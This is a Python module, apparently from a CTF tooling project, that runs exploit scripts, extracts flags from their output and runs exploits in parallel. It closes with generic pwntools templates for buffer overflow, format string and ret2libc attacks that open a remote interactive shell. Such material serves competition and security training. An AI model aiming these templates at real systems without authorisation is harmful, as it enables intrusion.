"""
Exploit Runner Module
Execute exploit scripts and capture flags
"""

import asyncio
import os
import re
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Optional, Union, Callable
import logging

logger = logging.getLogger("ctf-mcp.network.exploit_runner")


class ExploitStatus(Enum):
    """Exploit execution status"""
    PENDING = auto()
    RUNNING = auto()
    SUCCESS = auto()
    FAILED = auto()
    TIMEOUT = auto()
    ERROR = auto()


@dataclass
class ExploitResult:
    """Result from exploit execution"""
    status: ExploitStatus = ExploitStatus.PENDING
    flag: Optional[str] = None
    output: str = ""
    stderr: str = ""
    return_code: int = -1
    duration: float = 0.0
    error: Optional[str] = None
    metadata: dict[str, Any] = field(default_factory=dict)

    @property
    def success(self) -> bool:
        return self.status == ExploitStatus.SUCCESS and self.flag is not None

    def to_dict(self) -> dict:
        return {
            "status": self.status.name,
            "flag": self.flag,
            "output": self.output[:2000] if self.output else None,
            "return_code": self.return_code,
            "duration": self.duration,
            "error": self.error,
        }


class ExploitRunner:
    """
    Execute exploit scripts and extract flags.

    Features:
    - Python/shell script execution
    - Timeout control
    - Flag extraction
    - Output capture
    - Environment isolation
    """

    # Common flag patterns
    FLAG_PATTERNS = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'picoCTF\{[^}]+\}',
        r'HTB\{[^}]+\}',
        r'CUCTF\{[^}]+\}',
    ]

    def __init__(
        self,
        timeout: float = 300.0,
        flag_pattern: Optional[str] = None,
        working_dir: Optional[str] = None,
        env: Optional[dict] = None,
    ):
        """
        Initialize exploit runner.

        Args:
            timeout: Execution timeout in seconds
            flag_pattern: Custom flag regex pattern
            working_dir: Working directory for execution
            env: Environment variables
        """
        self.timeout = timeout
        self.flag_pattern = flag_pattern
        self.working_dir = working_dir
        self.env = env or {}

    def find_flags(self, text: str) -> list[str]:
        """Find all flags in text"""
        flags = []

        patterns = self.FLAG_PATTERNS.copy()
        if self.flag_pattern:
            patterns.insert(0, self.flag_pattern)

        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            flags.extend(matches)

        return list(set(flags))

    def run_script(
        self,
        script_path: str,
        args: Optional[list[str]] = None,
        stdin: Optional[str] = None,
    ) -> ExploitResult:
        """
        Run an exploit script.

        Args:
            script_path: Path to script file
            args: Command line arguments
            stdin: Input to send to script

        Returns:
            ExploitResult with execution results
        """
        result = ExploitResult(status=ExploitStatus.RUNNING)
        start_time = time.time()

        if not os.path.exists(script_path):
            result.status = ExploitStatus.ERROR
            result.error = f"Script not found: {script_path}"
            return result

        # Determine interpreter
        cmd = self._get_command(script_path, args or [])

        # Prepare environment
        env = os.environ.copy()
        env.update(self.env)

        try:
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                input=stdin,
                cwd=self.working_dir,
                env=env,
            )

            result.output = process.stdout
            result.stderr = process.stderr
            result.return_code = process.returncode

            # Search for flags
            combined_output = f"{process.stdout}\n{process.stderr}"
            flags = self.find_flags(combined_output)

            if flags:
                result.status = ExploitStatus.SUCCESS
                result.flag = flags[0]
            elif process.returncode == 0:
                result.status = ExploitStatus.SUCCESS
            else:
                result.status = ExploitStatus.FAILED

        except subprocess.TimeoutExpired:
            result.status = ExploitStatus.TIMEOUT
            result.error = f"Execution timed out after {self.timeout}s"

        except Exception as e:
            result.status = ExploitStatus.ERROR
            result.error = str(e)

        result.duration = time.time() - start_time
        return result

    def run_code(
        self,
        code: str,
        language: str = "python",
        args: Optional[list[str]] = None,
        stdin: Optional[str] = None,
    ) -> ExploitResult:
        """
        Run exploit code directly.

        Args:
            code: Source code to execute
            language: Programming language (python, bash, ruby)
            args: Command line arguments
            stdin: Input data

        Returns:
            ExploitResult
        """
        # Create temp file
        suffix = {
            "python": ".py",
            "bash": ".sh",
            "ruby": ".rb",
            "perl": ".pl",
        }.get(language, ".txt")

        with tempfile.NamedTemporaryFile(
            mode='w',
            suffix=suffix,
            delete=False
        ) as f:
            f.write(code)
            temp_path = f.name

        try:
            result = self.run_script(temp_path, args, stdin)
            result.metadata["language"] = language
            result.metadata["temp_file"] = temp_path
            return result

        finally:
            try:
                os.unlink(temp_path)
            except Exception:
                pass

    def run_pwntools_exploit(
        self,
        code: str,
        target_host: Optional[str] = None,
        target_port: Optional[int] = None,
    ) -> ExploitResult:
        """
        Run a pwntools-based exploit.

        Args:
            code: Pwntools exploit code
            target_host: Override target host
            target_port: Override target port

        Returns:
            ExploitResult
        """
        # Prepare imports and setup
        setup = """
from pwn import *
context.log_level = 'error'
"""
        if target_host and target_port:
            setup += f"""
HOST = "{target_host}"
PORT = {target_port}
"""

        full_code = setup + code

        return self.run_code(full_code, language="python")

    def _get_command(self, script_path: str, args: list[str]) -> list[str]:
        """Determine command to run script"""
        ext = os.path.splitext(script_path)[1].lower()

        interpreters = {
            ".py": [sys.executable],
            ".sh": ["bash"],
            ".rb": ["ruby"],
            ".pl": ["perl"],
            ".js": ["node"],
        }

        interpreter = interpreters.get(ext, [])
        return interpreter + [script_path] + args


class AsyncExploitRunner(ExploitRunner):
    """Async version of ExploitRunner for parallel execution"""

    async def run_script_async(
        self,
        script_path: str,
        args: Optional[list[str]] = None,
        stdin: Optional[str] = None,
    ) -> ExploitResult:
        """
        Run script asynchronously.

        Args:
            script_path: Path to script
            args: Arguments
            stdin: Input data

        Returns:
            ExploitResult
        """
        result = ExploitResult(status=ExploitStatus.RUNNING)
        start_time = time.time()

        if not os.path.exists(script_path):
            result.status = ExploitStatus.ERROR
            result.error = f"Script not found: {script_path}"
            return result

        cmd = self._get_command(script_path, args or [])
        env = os.environ.copy()
        env.update(self.env)

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.PIPE if stdin else None,
                cwd=self.working_dir,
                env=env,
            )

            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(stdin.encode() if stdin else None),
                    timeout=self.timeout
                )

                result.output = stdout.decode('utf-8', errors='replace')
                result.stderr = stderr.decode('utf-8', errors='replace')
                result.return_code = process.returncode

                combined = f"{result.output}\n{result.stderr}"
                flags = self.find_flags(combined)

                if flags:
                    result.status = ExploitStatus.SUCCESS
                    result.flag = flags[0]
                elif process.returncode == 0:
                    result.status = ExploitStatus.SUCCESS
                else:
                    result.status = ExploitStatus.FAILED

            except asyncio.TimeoutError:
                process.kill()
                result.status = ExploitStatus.TIMEOUT
                result.error = f"Execution timed out after {self.timeout}s"

        except Exception as e:
            result.status = ExploitStatus.ERROR
            result.error = str(e)

        result.duration = time.time() - start_time
        return result

    async def run_parallel(
        self,
        exploits: list[dict],
    ) -> list[ExploitResult]:
        """
        Run multiple exploits in parallel.

        Args:
            exploits: List of exploit configs with 'script_path' and optional 'args'

        Returns:
            List of ExploitResults
        """
        tasks = []
        for exploit in exploits:
            task = self.run_script_async(
                exploit.get('script_path'),
                exploit.get('args'),
                exploit.get('stdin'),
            )
            tasks.append(task)

        return await asyncio.gather(*tasks)


class ExploitTemplate:
    """
    Pre-built exploit templates for common scenarios.
    """

    @staticmethod
    def buffer_overflow(
        target: str,
        port: int,
        offset: int,
        payload: bytes,
        padding: bytes = b"A",
    ) -> str:
        """Generate buffer overflow exploit template"""
        return f'''
from pwn import *

target = "{target}"
port = {port}
offset = {offset}

p = remote(target, port)

payload = {padding!r} * offset
payload += {payload!r}

p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def format_string(
        target: str,
        port: int,
        format_offset: int,
        write_addr: int,
        write_value: int,
    ) -> str:
        """Generate format string exploit template"""
        return f'''
from pwn import *

target = "{target}"
port = {port}

p = remote(target, port)

# Format string parameters
offset = {format_offset}
target_addr = {hex(write_addr)}
value = {hex(write_value)}

# Generate format string payload
payload = fmtstr_payload(offset, {{target_addr: value}})

p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def ret2libc(
        target: str,
        port: int,
        offset: int,
        libc_base: int,
        system_offset: int,
        binsh_offset: int,
    ) -> str:
        """Generate ret2libc exploit template"""
        return f'''
from pwn import *

target = "{target}"
port = {port}

p = remote(target, port)

# Addresses
libc_base = {hex(libc_base)}
system = libc_base + {hex(system_offset)}
binsh = libc_base + {hex(binsh_offset)}

# Build payload
payload = b"A" * {offset}
payload += p64(system)
payload += p64(0)  # return address
payload += p64(binsh)

p.sendline(payload)
p.interactive()
'''
